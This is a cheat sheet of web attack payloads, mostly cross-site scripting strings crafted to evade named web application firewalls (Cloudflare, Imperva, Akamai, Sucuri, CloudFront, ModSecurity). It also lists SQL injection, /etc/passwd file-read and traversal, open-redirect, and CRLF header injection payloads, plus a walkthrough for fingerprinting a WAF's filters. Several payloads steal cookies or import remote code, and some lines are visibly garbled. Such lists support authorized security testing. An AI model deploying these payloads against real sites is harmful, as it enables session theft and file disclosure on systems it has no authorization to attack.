Cloudflare WAF Payload:
-----------------------
"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
&lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload​=alert("XSS") > 
utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
”/>&_lt;_script>alert(1)&_lt;/script>”/>
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover​=prompt&#40;1&#41;&#47;&#47;">XYZ</a>
<​script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/<​/script /***/
ellm1%3cscript%3ealert(1)%3c%2fscript%3ec2xwc
"><iNput///type="password"////id="CF-bypaSS" name="query"////value=""///oNfocUs​="alert('hello')" AutOfoCus="" />
&lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
<math><x xlink:href=javascript​:confirm`1`>click
<img%20src=x%20onerror=”%26%2397%26%23108%26%23101%26%23114%26%23116(1)”>
<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
<Svg%K9OnLoad=%7Krompt%6K1%6K>
<details open ontoggle​=content['al'%2B'ert'](1) >


Imperva WAF Bypass:
-------------------
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
<svg><set onbegin​=d=document,b='`',d['loca'+'tion']='javascript​&colon;aler'+'t'+b+domain+b>
%22%3EEnter_Mouse_Pointer_Here_to_get_XSS%3C%5K/onpointerenter​=alert(location)%3E%3!–


Akamai WAF Bypass:
-------------------
<​style>@keyframes a{}b{animation:a;}<​/style><b/onanimationstart​=prompt`${document.domain}&#x60;>


This payload worked on Sucuri WAF:
----------------------------------
"><input/onauxclick​="[1].map(prompt)">


Advanced XSS Payloads:
----------------------
[a](javascript​:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74​&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
![a'"`onerror=prompt(document.cookie)](x)
[notmalicious](javascript​:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
<​script>a="import\x28"<​/script> <​script>b="`//0-a\x2e"<​/script> <​script>c="nl`\x29"<​/script><​script>d=setTimeout<​/script><​script>e=eval<​/script><​script>f=`${a}${b}${c}`<​/script><​script>d`e\x28f\x29`<​/script>
1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>
<img/src/onerror​=arguments[0].path.pop().['al'+'ert'](1)>
JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
d=document,b='`',d['loca'+'tion']='javascript​&colon;aler'+'t'+b+domain+b
%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A
testtest”+onmouseover%3D”alert%26%230000000040%3Bdocument[‘cookie’])
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt​&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a> 
<a/href=”j&#97v&#97script​&#x3A;&#97lert(document.cookie)”>ClickMe
<svg onload​=prompt&#0000000040document.domain)> Hex: <svg onload​=prompt&#x000000028;document.domain)>
<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
<object data="data:text/html,<​script>alert(1)<​/script>">
<img src=a onerror​="vbscript:msgbox 1"/>
decodeURI(/alert(%22xss%22)/.source)
<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;​&#x3A;alert(1)">
<img src=x onerror​="eval('\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>
<A HRef=//site.com AutoFocus %26%2362 OnFocus%0C=import(href)>
<​style>@keyframes a{}b{animation:a;}<​/style><b/onanimationstart​=prompt`${document.domain}&#x60;>
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
%2sscript%2ualert()%2s/script%2u
xss'"><iframe srcdoc​='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
"><img src=x onerrora=confirm() onerror​=confirm(1)>
"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>


SOME OF THE TOP XSS WAF BYPASS PAYLOADS :)
------------------------------------------
Akamai WAF:
-----------
'; k='e '%0Atop['al'+k+'rt'](1)//
*"><A HREF=\" AutoFocus OnFocus=top/**/?. ['ale '%2B'rt'](1)>

CloudFlare WAF:
---------------
<svg/onload=window["al"+"ert"]`1337'>
<Img src=OnXSS OnError=confirm(1337)>
<Svg Only=1 OnLoad=confirm (document.domain)>
<svg onload=alert&#0000000040document.cookie)>
<sVG/ONLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
%3CSVG/ONLY=1%20ONLOAD=confirm (document.domain)%3E
<Img Src=//X55.is OnLoad%0C=import (Src)>
<Svg Only=1 OnLoad=confirm(atob ("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>

Cloudfront Waf:
---------------
">'><details/open/ontoggle=confirm('XSS')>
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
*; window/*aabb*/ ['al '%2b'ert'] (document. /*aabb*/location); //
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>

Mod security:
-------------
<svg onload='new Function' ["Y000!"]. find (al\u0065rt)`'>

Imperva Waf:
------------
<Img Src=//X55.is OnLoad%0C=import(Src)>
<svg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9; //</div">
<details x=XXXXXXXXXXXXXXXXXXX
xxxxxxxx:2 open ontoggle=&#x0000000000061;
Lert&#x000000028; origin&#x000029;>



SQL Injection Bypass Akamai WAF Using HPP:
------------------------------------------
q=1%27Union+DistinctRow/*&q=*/Select+1



Local File Read/Disclosure - Akamai Bypass:
-------------------------------------------
file:///etc/x%252Fy/../passwd?/../passwd



Payloads for LFR/LFD:
---------------------
file:/etc/passwd%3F/ 
file:/etc%252Fpasswd/ 
file:/etc%252Fpasswd%3F/ 
file:///etc/%3F/../passwd 
file:${br}/et${u}c%252Fpas${te}swd%3F/ 
file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
:/e?c/pas?w?
/e*c/p*w*d



OPENREDIRECT TO XSS BYPASS LIST :
--------------------------------
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
javascript://anything%0D%0A%0D%0Awindow.alert(document.cookie) javascript://www.whitelisteddomain.tld?%a0alert%281%29
javascript://%250Alert(document.location=document.cookie)
javascript://https://whitelisted.com/?z=%0Aalert(1)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
//j%5c%5cjavascript%3aalert(document.domain)
javascript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
%09Jav%09ascript:alert(document.domain)
javascript://sub.domain.com/%0Aalert(1)
javascript://%250Aalert(1)//?1\
javascript://%250A1?alert(1):0
java%0d%0ascript%0d%0a:alert(0)
java%0d%0ascript%0d%0a:alert(0)
java%07script:prompt`0`
java%09scrip%07t: prompt`0`
javascript:confirm(1)
javascript:prompt (1)
javascript://%250Aalert(1)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)




// XSS WAF Bypass using location concatenation:

// Fingerprinting WAF (Cloudflare)
"><img src="x"> allowed
"><img src=x onerror> blocked
"><img src=x_onanything=""> not blocked // this shows blacklisting is being used.
"><body onload> = not blocked
"><body onload=> = blocked
"><body onbeforescriptexecute=x> not blocked // auto executes X
"><body onbeforescriptexecute=x()> = blocked
"><body onbeforescriptexecute=x(> = not blocked // Regex based protection used for blocking parenthesis "><body onbefore scriptexecute=x``> blocked // no chance of back tiks
"><body onbeforescriptexecute="location=javascript:"> blocked // javascript 
keyword not allowed "><body onbefore scriptexecute="b='a';location='jav'+b+' script: "> not blocked
"><BODY onbeforescriptexecute="c=')';b='a';location='jav'+b+'script:x('+c"> not blocked
// this sets location="javascript:x()" which bypasses keyword based and parenthesis filteration.

Keywords such as confirm, alert, prompt, document. were blocked. The same technique can be used to concatenate these keywords:
"><BODY onbeforescriptexecute="x1='cookie'; c=') '; b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'+x1+c">
Result: location="javascript:confirm(document.domain)"


<!-- You can hide your XSS payload inside SVG or Math element to bypass the XSS Sanitizer or WAF filter. -->
<svg>
  <style>
    <script>alert(1)</script>
  </style>
</svg>

<math>
  <style>
    <img src onerror=alert (2)>
  </style>
</math>



Top 20 Event Handlers to Trigger XSS:
-------------------------------------
onload=alert()
onerror=confirm()
onfocus=prompt()
onclick=alert()
onmouseover=confirm()
onchange=prompt() 
onmouseup-alert()
onkeydown=confirm() 
onkeyup-prompt()
onkeypress=alert() 
onMoveOn=confirm() 
onabort=prompt() 
ondblclick=alert() 
onresize=confirm() 
onselect=prompt() 
onscroll=alert() 
onsubmit=confirm() 
onblur-prompt() 
onreset-alert() 
onunload=confirm()


CRLF Injection Payloads:
------------------------
/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection



Local File Inclusion:
---------------------
Accept: ../../../../.././../../../../etc/passwd{{ 
Accept: ../../../../.././../../../../etc/passwd{%0D 
Accept: ../../../../.././../../../../etc/passwd{%0A 
Accept: ../../../../.././../../../../etc/passwd{%00 
Accept: ../../../../.././../../../../etc/passwd{%0D{{ 
Accept: ../../../../.././../../../../etc/passwd{%0A{{ 
Accept: ../../../../.././../../../../etc/passwd{%00{{





